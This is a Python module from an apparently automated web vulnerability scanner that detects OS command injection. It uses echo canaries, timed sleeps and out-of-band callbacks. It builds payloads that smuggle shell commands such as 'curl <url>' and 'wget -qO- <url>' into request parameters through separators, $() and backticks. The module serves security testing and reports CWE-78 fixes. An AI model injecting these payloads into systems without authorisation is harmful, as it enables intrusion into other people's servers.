"""OS command injection scanner (PRD §6.8 Command Injection).

Output-based: chain ``echo <canary>`` via shell metacharacters and look for the
canary alone in the response (execution), distinguishing it from mere reflection
of the payload. Time-based (aggressive only): chain a sleep and measure delay.
"""

from __future__ import annotations

import asyncio
import secrets
import time
from collections.abc import AsyncIterator

from orthrus.core.context import ScanContext
from orthrus.core.schemas import Aggressiveness, Confidence, Evidence, Finding, Severity
from orthrus.scanners._injection import InjectionPoint, injection_points, send, used_url
from orthrus.scanners._payloads import cmd_output_payloads, cmd_time_payloads
from orthrus.scanners.base_scanner import BaseScanner
from orthrus.scanners.registry import register

SCANNER_NAME = "cmd-injection"
MAX_POINTS = 120
MAX_OOB_POINTS = 40
SLEEP_SECONDS = 5
POLL_DELAY = 3.0


def _output_payloads(value: str, canary: str) -> list[str]:
    return cmd_output_payloads(value, canary)


def _time_payloads(value: str) -> list[str]:
    return cmd_time_payloads(value, SLEEP_SECONDS)


def cmd_oob_payloads(value: str, url: str) -> list[str]:
    """Shell payloads that fetch an out-of-band callback URL via common tools.

    A callback hit proves blind OS command execution even when no command output
    is reflected and timing is too noisy — the strongest signal for blind RCE.
    """
    fetchers = (f"curl {url}", f"wget -qO- {url}")
    seps = (";", "|", "&&", "&")
    payloads: list[str] = []
    for fetch in fetchers:
        payloads.extend(f"{value}{sep}{fetch}" for sep in seps)
        payloads.append(f"$({fetch})")
        payloads.append(f"`{fetch}`")
    return payloads


def cmd_executed(canary: str, body: str) -> bool:
    """Canary present as command *output*, not just a reflected ``echo <canary>``."""
    return canary in body and f"echo {canary}" not in body


def _param_value(point: InjectionPoint) -> str:
    for p in point.endpoint.params:
        if p.name == point.param:
            return p.value or "1"
    return "1"


@register
class CommandInjectionScanner(BaseScanner):
    name = SCANNER_NAME
    vuln_type = "cmd-injection"
    min_aggressiveness = Aggressiveness.NORMAL

    async def scan(self, ctx: ScanContext) -> AsyncIterator[Finding]:
        aggressive = ctx.config.aggressiveness == Aggressiveness.AGGRESSIVE
        count = 0
        for point in injection_points(ctx):
            if count >= MAX_POINTS:
                break
            count += 1
            value = _param_value(point)

            finding = await self._output_based(ctx, point, value)
            if finding is None and aggressive:
                finding = await self._time_based(ctx, point, value)
            if finding is not None:
                yield finding

        # Out-of-band: catches blind command injection (no output, noisy timing)
        # by proving the server executed an attacker command that called back.
        async for finding in self._oob_based(ctx):
            yield finding

    async def _output_based(
        self, ctx: ScanContext, point: InjectionPoint, value: str
    ) -> Finding | None:
        canary = "ORTHRUS" + secrets.token_hex(4).upper()
        for payload in _output_payloads(value, canary):
            resp = await send(ctx, point, payload)
            if resp is None:
                continue
            if cmd_executed(canary, resp.text):
                return Finding(
                    vuln_type="cmd-injection",
                    title=f"OS command injection (output-based) in '{point.param}'",
                    severity=Severity.CRITICAL,
                    confidence=Confidence.FIRM,
                    url=used_url(point, payload),
                    parameter=point.param,
                    param_location=point.location,
                    description=(
                        f"Parameter '{point.param}' is passed to an OS shell; an injected echo "
                        "command executed and its output was returned. This is remote code "
                        "execution."
                    ),
                    remediation=(
                        "Avoid invoking shells with user input. Use argument arrays / native APIs "
                        "and strict allow-list validation; never pass user data to a shell string."
                    ),
                    cwe="CWE-78",
                    scanner=SCANNER_NAME,
                    evidence=Evidence(
                        request_raw=f"{point.param}={payload}",
                        matched_at=canary,
                        notes="echo canary returned as command output",
                    ),
                )
        return None

    async def _time_based(
        self, ctx: ScanContext, point: InjectionPoint, value: str
    ) -> Finding | None:
        start = time.monotonic()
        baseline = await send(ctx, point, value)
        baseline_elapsed = time.monotonic() - start
        if baseline is None:
            return None
        for payload in _time_payloads(value):
            start = time.monotonic()
            resp = await send(ctx, point, payload)
            elapsed = time.monotonic() - start
            if resp is None:
                continue
            if elapsed >= baseline_elapsed + SLEEP_SECONDS * 0.6:
                return Finding(
                    vuln_type="cmd-injection",
                    title=f"OS command injection (time-based) in '{point.param}'",
                    severity=Severity.HIGH,
                    confidence=Confidence.FIRM,
                    url=used_url(point, payload),
                    parameter=point.param,
                    param_location=point.location,
                    description=(
                        f"Parameter '{point.param}' appears to execute OS commands; an injected "
                        f"sleep delayed the response by {elapsed:.1f}s (baseline "
                        f"{baseline_elapsed:.1f}s)."
                    ),
                    remediation=(
                        "Avoid invoking shells with user input. Use argument arrays / native APIs "
                        "and strict allow-list validation; never pass user data to a shell string."
                    ),
                    cwe="CWE-78",
                    scanner=SCANNER_NAME,
                    evidence=Evidence(
                        request_raw=f"{point.param}={payload}",
                        notes=f"response delayed {elapsed:.1f}s vs baseline {baseline_elapsed:.1f}s",
                    ),
                )
        return None

    async def _oob_based(self, ctx: ScanContext) -> AsyncIterator[Finding]:
        if ctx.callback is None:
            return
        jobs: list[tuple[InjectionPoint, str, str]] = []
        count = 0
        for point in injection_points(ctx):
            if count >= MAX_OOB_POINTS:
                break
            count += 1
            value = _param_value(point)
            token, url = ctx.callback.new_token()
            sent = False
            for payload in cmd_oob_payloads(value, url):
                if await send(ctx, point, payload) is not None:
                    sent = True
            if sent:
                jobs.append((point, token, url))

        if not jobs:
            return
        await asyncio.sleep(POLL_DELAY)

        for point, token, url in jobs:
            interactions = await ctx.callback.poll(token)
            if not interactions:
                continue
            hit = interactions[0]
            store = getattr(ctx, "store", None)
            if store is not None:
                await store.add_callback(
                    token, hit.protocol, hit.source_ip, {"path": hit.path, "method": hit.method}
                )
            yield Finding(
                vuln_type="cmd-injection",
                title=f"OS command injection (out-of-band) in '{point.param}'",
                severity=Severity.CRITICAL,
                confidence=Confidence.FIRM,
                url=used_url(point, url),
                parameter=point.param,
                param_location=point.location,
                description=(
                    f"An injected shell command in '{point.param}' fetched an attacker-controlled "
                    f"URL: the callback server received a {hit.protocol.upper()} request from "
                    f"{hit.source_ip}. This proves blind OS command execution (remote code "
                    "execution) even though no command output was reflected."
                ),
                remediation=(
                    "Avoid invoking shells with user input. Use argument arrays / native APIs and "
                    "strict allow-list validation; never pass user data to a shell string."
                ),
                cwe="CWE-78",
                scanner=SCANNER_NAME,
                evidence=Evidence(
                    request_raw=f"{point.param}=<shell payload fetching {url}>",
                    notes=f"OOB callback from {hit.source_ip} (token {token})",
                    matched_at=hit.source_ip,
                ),
            )


__all__ = ["CommandInjectionScanner", "cmd_executed", "cmd_oob_payloads"]
